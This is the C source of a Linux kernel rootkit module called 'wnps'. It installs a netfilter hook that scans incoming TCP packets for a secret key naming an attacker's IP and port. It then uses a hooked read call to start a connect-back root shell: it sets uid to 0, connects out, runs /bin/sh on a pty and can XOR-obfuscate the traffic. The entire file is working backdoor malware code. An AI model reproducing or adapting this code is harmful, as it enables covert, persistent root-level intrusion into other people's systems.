/* wnps - *wnps is not poc shell*
 *
 * It register a netfilter hooks to filter the KEY in the packet that
 * contains the attackers' ip and port.marked the flag 'wztshell',when the system
 * calls read(we has hooked read) get the flag,it start the connect back shell.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/file.h>
#include <linux/types.h>
#include <linux/errno.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <net/sock.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/termbits.h>
#include <asm/ioctls.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include "config.h"
#include "kshell.h"
#include "syscalls.h"

#define PORT_NUM	10
#define IP_NUM		20
#define BUFF_NUM	512

#define TIOCSCTTY       0x540E
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414
#define ECHAR           0x1d

#define __NR_e_exit 	__NR_exit

struct winsize {
        unsigned short ws_row;
        unsigned short ws_col;
        unsigned short ws_xpixel;
        unsigned short ws_ypixel;
};

/**
 * Athough we had in then kernel space,it's more hardly use kernel function then
 * we directly use syscall calls.
 */
static inline my_syscall0(pid_t, fork);
static inline my_syscall2(int, kill, pid_t, pid, int, sig);
static inline my_syscall1(int, chdir, const char *, path);
static inline my_syscall1(long, ssetmask, int, newmask);
static inline my_syscall3(int, write, int, fd, const char *, buf, off_t, count);
static inline my_syscall3(int, read, int, fd, char *, buf, off_t, count);
static inline my_syscall1(int, e_exit, int, exitcode);
static inline my_syscall3(int, open, const char *, file, int, flag, int, mode);
static inline my_syscall1(int, close, int, fd);
static inline my_syscall2(int, dup2, int, oldfd, int, newfd);
static inline my_syscall3(pid_t, waitpid, pid_t, pid, int *, status, int, options);
static inline my_syscall3(int, execve, const char *, filename,
	const char **, argv, const char **, envp);
static inline my_syscall3(long, ioctl, unsigned int, fd, unsigned int, cmd,
		unsigned long, arg);
static inline my_syscall5(int, _newselect, int, n, fd_set *, readfds, fd_set *,
		writefds, fd_set *, exceptfds, struct timeval *, timeout);
static inline my_syscall2(unsigned long, signal, int, sig,
		__sighandler_t, handler);

extern int errno;

spinlock_t shell_lock = SPIN_LOCK_UNLOCKED;

int ptmx,epty;

struct nf_hook_ops nfho;

unsigned long myowner_port;
unsigned long myowner_ip;
unsigned int wztshell = 0;

char connect_ip[IP_NUM] = {0};

unsigned char xorkeys[5] = {'x','s','e','c',0};

/**
 * the code copy from adore-ng
 */
int wnps_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
   
	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
		;
	ptr--;
	while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
			break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/**
 * in_aton - change str to ipv4 address.
 *
 * see net/core/utils.c
 */
__u32 wnps_in_aton(const char *str)
{
	unsigned long l;
	unsigned int val;
	int i;

	l = 0;
	for (i = 0; i < 4; i++) {
		l <<= 8;
		if (*str != '\0') {
			val = 0;
			while (*str != '\0' && *str != '.') {
				val *= 10;
				val += *str - '0';
				str++;
			}
			l |= val;
			if (*str != '\0')
				str++;
		}
	}

	return(htonl(l));
}

/**
 * encryptcode - encrypt strings in a buf.
 * @buf: strings in it.
 * @count: the length of buf.
 *
 * we can use random char to improve encrypt strength.
 */
void encrypt_code(char *buf,int count)
{
	char *p;
	int i,j;

	for (i = 0; i < 4; i++)
		for (p = buf,j = 0; j < count; j++,p++)
			*p = *p ^ xorkeys[i];
}

/**
 * kshell - start a connect back shell in kernel space.
 * @ip: remote ip to connect.
 * @port: remote port to connect.
 * both ip and port are network bytes.
 *
 * When the system call 'read' had read the flag 'wztshell',it will be use this
 * function to start a connect back shell.
 *
 * return value is always NF_ACCEPT.It's not firewall,just want to filter the key.
 */
int kshell(int ip,int port)
{
        struct task_struct *ptr = current;
	struct socket *sock;
        struct sockaddr_in server;
	struct winsize ws;
        mm_segment_t old_fs;
        fd_set s_read;
        int soc, tmp_pid, i;
	int byte1,count,rlen;
	int error;
	int len = sizeof(struct sockaddr);
        char tmp[101],buf[101];
	unsigned char *p,*d;
        unsigned char wb[5];
	
        old_fs = get_fs();

        ptr->uid = 0;
        ptr->euid = 0;
        ptr->gid = SGID;
        ptr->egid = 0;

        set_fs(KERNEL_DS);
 	ssetmask(~0);

	for (i = 0;i < 4096; i++)
		close(i);
       
        error = sock_create(AF_INET,SOCK_STREAM,0,&sock);
        if (error < 0) {
		#if DEBUG == 1
                printk("[-] socket_create failed: %d\n",error);
                #endif

		sock_release(sock);
		wztshell = 0;
		e_exit(-1);
                return -1;
        }
	
	soc = sock_map_fd(sock);
	if (soc < 0) {
		#if DEBUG == 1
		printk("[-] sock_map_fd() failed.\n");
		#endif

		sock_release(sock);
		wztshell = 0;
		e_exit(-1);
		return -1;
	}

	for (i = 0; i < 8; i++)
		server.sin_zero[i] = 0;

	server.sin_family = PF_INET;
	server.sin_addr.s_addr = ip;
	server.sin_port = port;

        error = sock->ops->connect(sock,(struct sockaddr *)&server,len,sock->file->f_flags);
	if (error < 0) {
		#if DEBUG == 1
		printk("[-] connect to failed.\n");	
		#endif

		e_exit(-1);
		return -1;
	}

        epty = get_pty();
        set_fs(old_fs);

        if (!(tmp_pid = fork()))
	       start_shell();

	set_fs(KERNEL_DS);

        /*
	#if ENCRYPT == 1
	encrypt_code(banner,200);
	#endif
        write(soc,banner,200);
        */
        
        while (1) {
	        FD_ZERO(&s_read);
	        FD_SET(ptmx, &s_read);
	        FD_SET(soc, &s_read);

	        if (_newselect((ptmx > soc ? ptmx+1 : soc+1), &s_read, 0, 0, NULL) < 0)
		      break;

                if (FD_ISSET(ptmx, &s_read)) {
                        byte1 = read(ptmx, tmp, 100);
			if (byte1 <= 0)
			     break;
			#if ENCRYPT == 1
			encrypt_code(tmp,byte1);
			#endif
                        write(soc, tmp, byte1);
		}

                if (FD_ISSET(soc, &s_read)) {
                        d = buf;
                        count = read(soc, buf, 100);
			if (count <= 0)
			     break;
			#if ENCRYPT == 1
			encrypt_code(buf,count);
			#endif
			
                        p = memchr(buf, ECHAR, count);
                        if (p) {
                                rlen = count - ((long) p - (long) buf);

                                /* wait for rest */
                                if (rlen > 5) rlen = 5;
                                memcpy(wb, p, rlen);
                                if (rlen < 5) {
                               	        read(soc, &wb[rlen], 5 - rlen);
					#if ENCRYPT == 1
					encrypt_code(&wb[rlen],5 - rlen);
					#endif
                                }

                                /* setup window */
                                ws.ws_xpixel = ws.ws_ypixel = 0;
                                ws.ws_col = (wb[1] << 8) + wb[2];
                                ws.ws_row = (wb[3] << 8) + wb[4];
                                ioctl(ptmx, TIOCSWINSZ, (unsigned long)&ws);
                                kill(0, SIGWINCH);

                                /* write the rest */
                                write(ptmx, buf, (long) p - (long) buf);
                                rlen = ((long) buf + count) - ((long)p+5);
                                if (rlen > 0) write(ptmx, p+5, rlen);
                        } else
                      		if (write(ptmx, d, count) <= 0) break;
		}

	}

        kill(tmp_pid, SIGKILL);

        set_fs(old_fs);
        e_exit(0);

        return -1;
}

/**
 * get_pty - create a pseudo terminal.
 *
 * /dev/ptmx is the major device,so wo open it to get the next free pts.
 * And then open the ptsX.
 *
 * return the file descriptor of the free ptsX.
 */
int get_pty(void)
{
        char buf[128];
        int npty, lock = 0;

        ptmx = open("/dev/ptmx", O_RDWR, S_IRWXU);

        ioctl(ptmx, TIOCGPTN, (unsigned long) &npty);
	ioctl(ptmx, TIOCSCTTY,(unsigned long) &npty);
        ioctl(ptmx, TIOCSPTLCK, (unsigned long) &lock);

        sprintf(buf, "/dev/pts/%d", npty);
        npty = open(buf, O_RDWR, S_IRWXU);

        return npty;
}

/**
 * strat_shell - use system call 'exevce' to get a root shell.
 */
void start_shell(void)
{
        struct task_struct *ptr = current;
        mm_segment_t old_fs;

        old_fs = get_fs();
        set_fs(KERNEL_DS);

        ptr->uid = 0;
        ptr->euid = 0;
        ptr->gid = SGID;
        ptr->egid = 0;

        dup2(epty, 0);
        dup2(epty, 1);
        dup2(epty, 2);

        chdir(HOME);

        execve("/bin/sh", (const char **) earg, (const char **) env);

        e_exit(-1);
}

/**
 * hook_func -   register a netfiter hooks to filter the attacker's ip and port.
 *
 * parameter see netfiler.h
 *
 * Filter the TCP packet contains the attacter's ip and port.And the mark the flag
 * 'wztshell'
 */
unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff **skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff *))
{
        struct sk_buff *sk = *skb;
        struct iphdr *ip;
	struct tcphdr *tcphdr;
	char buf[BUFF_NUM],*data = NULL;
	char *p,*p1,port[PORT_NUM];
	unsigned short len;
	int i = 0,j = 0,connect_port;

        if (!sk)
                return NF_ACCEPT;
                
        switch (sk->nh.iph->protocol) {
                case 1:
			#if DEBUG == 1
                        printk("[+] Got a icmp packet.\n");
			#endif
			/*
	                 * we do nothing here in this version.
			 */
                        
                        return NF_ACCEPT;
                        
                case 6:
               	        ip = sk->nh.iph;
                       	tcphdr = (struct tcphdr *)((__u32 *)ip + ip->ihl);
			data = (char *)((int *)tcphdr + (int)(tcphdr->doff));

                        /*
                         * filter the connected tcp packet
                         */
			if ((p = strstr(data,TCP_SHELL_KEY)) != NULL) {
				p += strlen(TCP_SHELL_KEY) + 1;
				if ((p1 = strstr(p,":")) != NULL) {
					p1++;
					i = 0;
                                	while (*p1 >= '0' && *p1 <= '9') {
						if (i > PORT_NUM)
							goto out;
						port[i++] = *p1++;
					}
					port[i] = 0;

					j = 0;
					while (*p != ':') {
						if (j > IP_NUM)
							goto out;
						connect_ip[j++] = *p++;
					}
					connect_ip[j] = 0;
	
					myowner_ip = wnps_in_aton(connect_ip);
				}
				else{
					i = 0;
					while (*p >= '0' && *p <= '9') {
						port[i++] = *p++;
					}
					port[i] = 0;
					
					myowner_ip = sk->nh.iph->saddr;
					sprintf(connect_ip,"%u.%u.%u.%u",NIPQUAD(myowner_ip));
				}

				connect_port = wnps_atoi(port);
				if (connect_port >= 65535 || connect_port <= 0)
					goto out;

				myowner_port = htons(connect_port);
                                wztshell = 1;

				#if DEBUG == 1
                                printk("[+] Got %u.%u.%u.%u : %d\n",NIPQUAD(myowner_ip),ntohs(myowner_port));
                        	#endif
                                goto out;
			}

                        /*
                         * filter the non connected tcp packet.
                         */
			len = (unsigned short)sk->nh.iph->tot_len;
			len = htons(len);

			if (len > BUFF_NUM - 1)
				len = BUFF_NUM -1;

			memcpy(buf,(void *)sk->nh.iph,len);

			for (i = 0; i < len; i++)
				if (buf[i] == 0)
					buf[i] = 1;
			buf[len] =0;

                        if (strstr(buf,TCP_SHELL_KEY) != NULL) {
				if (!wztshell) {
                                	myowner_port = tcphdr->source;
                                	myowner_ip = sk->nh.iph->saddr;
                                	wztshell = 1;

					#if DEBUG == 1
                                	printk("[+] Got %u.%u.%u.%u : %d\n",NIPQUAD(myowner_ip),ntohs(myowner_port));
                        		#endif
				}
			}
			
			out:
			memset(buf,'\0',BUFF_NUM);
			memset(connect_ip,'\0',IP_NUM);
			memset(port,'\0',PORT_NUM);

                        return NF_ACCEPT;
                
                default:
                        return NF_ACCEPT;
        }
}

/**
 * register a netfilter hooks,hook.c will use it.
 */
int netfilter_test_init(void)
{	
	nfho.hook = hook_func;
	nfho.owner = NULL;
	nfho.pf = PF_INET;
	nfho.hooknum = NF_IP_PRE_ROUTING;
	nfho.priority = NF_IP_PRI_FIRST;
	
	nf_register_hook(&nfho);
	
	return 0;
}

/**
 * unregister the netfilter hooks.
 */
void netfilter_test_exit(void)
{	
	nf_unregister_hook(&nfho);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wzt");


